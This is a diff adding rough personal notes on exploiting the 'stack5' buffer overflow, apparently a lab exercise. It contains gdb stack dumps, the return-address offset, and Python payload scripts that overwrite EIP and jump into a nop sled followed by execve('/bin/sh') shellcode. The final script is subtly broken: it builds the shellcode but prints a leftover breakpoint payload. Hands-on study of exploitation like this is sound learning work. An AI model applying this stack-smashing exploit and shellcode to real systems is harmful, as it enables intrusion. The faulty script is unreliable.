@@ -1,0 +1,78 @@
+set disassembly-flavor intel
+AAAAAAAAAAAAAAAAAAAA
+*************x/40wx $esp
+start of buffer ------------------------>0xbffff750
+
+************x/2wx $ebp
+first one     second is ret
+is saved 
+0xbffff798:     0xbffff818      0xb7eadc76
+0xbffff798 
+inside gdb p/d 
+address of ret 0xBFFFF81C
+for shell code
+http://shell-storm.org/shellcode/files/shellcode-827.php
+p/d 0xBFFFF81C - 0xbffff750
+first one save *EBP second is the return address
+
+0xbffff740:     0xbffff750      0xb7ec6165      0xbffff758      0xb7eada75
+0xbffff750:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff760:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff770:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff780:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff790:     0x08048300      0x00000000      ->0xbffff818      0xb7eadc76
+0xbffff7a0:     0x00000001      0xbffff844      0xbffff84c      0xb7fe1848
+0xbffff7b0:     0xbffff800      0xffffffff      0xb7ffeff4      0x08048232
+0xbffff7c0:     0x00000001      0xbffff800      0xb7ff0626      0xb7fffab0
+0xbffff7d0:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
+x/2wx $ebp which is at address 
+0xbffff798:     0xbffff818      0xb7eadc76
+#this may or may not work memory is different outside gdb space so 
+we need a nop sled in order to account for these differences
+
+____________________illegal instruction
+import struct
+def p(x):
+  return struct.pack("I",x)
+
+payload  = ""
+payload += "\x41" * 76
+payload += p(0xBFFFF81C)
+payload += "\xCC" * 4
+print payload
+
+________Trace/breakpoint trap
+import struct
+def p(x):
+  return struct.pack("I",x)
+
+padding = "\x41" * 76
+eip     = p(0xBFFFF81C)
+nopsled = "\x90" * 100
+payload = "\xCC" * 4
+print padding+eip+nopsled+payload
+
+
+_______________Lets try it with our shellcode
+
+import struct
+def p(x):
+  return struct.pack("I",x)
+
+#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+padding = "\x41" * 76
+eip     = p(0xBFFFF81C + 20) #puts us somewhere in the nop sled
+nopsled = "\x90" * 100
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+print padding+eip+nopsled+payload
+#inside gdb
+
+define hook-stop
+ x/20i $eip
+ end
+si
+(python exp.py) | ./stack5 #nothing happens)
+must add (python exp.py; cat) | ./stack5
+(python /tmp/exp.py; cat) | ./stack5
+
+
